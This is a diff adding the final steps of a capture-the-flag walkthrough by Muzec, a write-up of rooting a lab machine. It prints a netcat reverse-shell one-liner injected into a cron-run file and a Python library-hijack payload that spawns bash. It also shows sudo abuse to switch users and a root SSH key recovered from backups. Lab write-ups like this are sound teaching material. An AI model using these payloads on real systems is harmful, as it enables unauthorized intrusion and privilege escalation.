@@ -104,5 +104,64 @@ Done with flag4.
 
 ![Image](https://imgur.com/QCKSWNF.png)
 
+Cool another note let read it.
 
+![image](https://imgur.com/Yxl0FDY.png)
 
+```
+Hi Toby,
+
+I've got the cron jobs set up now so don't worry about getting that done.
+
+Mat
+```
+
+![image](https://imgur.com/KioWdR6.png)
+
+Cool we have write permission on the file let echo our reverse shell payload in it `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f`  and start our ncat listener and in 1 min we have our shell smiling back to us.
+
+![Image](https://imgur.com/PnnZpB5.png)
+
+A note again cool let check it out fast.
+
+![image](https://imgur.com/VaoWXzd.png)
+
+Cool so i cd to the script directory and yes it something interesting.
+
+![Image](https://imgur.com/fPh0XNi.png)
+
+Going through the script i found out it using the cmd.py module to get command and lucky for us we have write permission to the cmd.py module library which can lead to python library hijacking.
+
+![Image](https://imgur.com/7w5Rhs0.png)
+
+### NOW LET ABUSE IT
+
+```
+import subprocess
+
+result = subprocess.run(['/bin/bash'])
+```
+
+![Image](https://imgur.com/Yk19jOx.png)
+
+Now let run our sudo command `sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py *` and boom we are user Will.
+
+![Image](https://imgur.com/NJN0Pv3.png)
+
+And we are done with the flag6 time to move to root checking the `opt` folder we found a backups folder some base64 strings let try to decode it with cyber chef.
+
+![Image](https://imgur.com/TODF99j.png)
+
+And boom we have root RSA Private key now let save it to a file and give it the `chmod 600 id_rsa` permission.
+
+![Image](https://imgur.com/hshX5dT.png)
+
+And boom flag7 done and we are root box rooted.
+
+![Image](https://imgur.com/iEIZeuD.png)
+
+Greeting From [Muzec](https://twitter.com/muzec_saminu)
+
+<br> <br>
+[Back To Home](../index.md)
+<br>
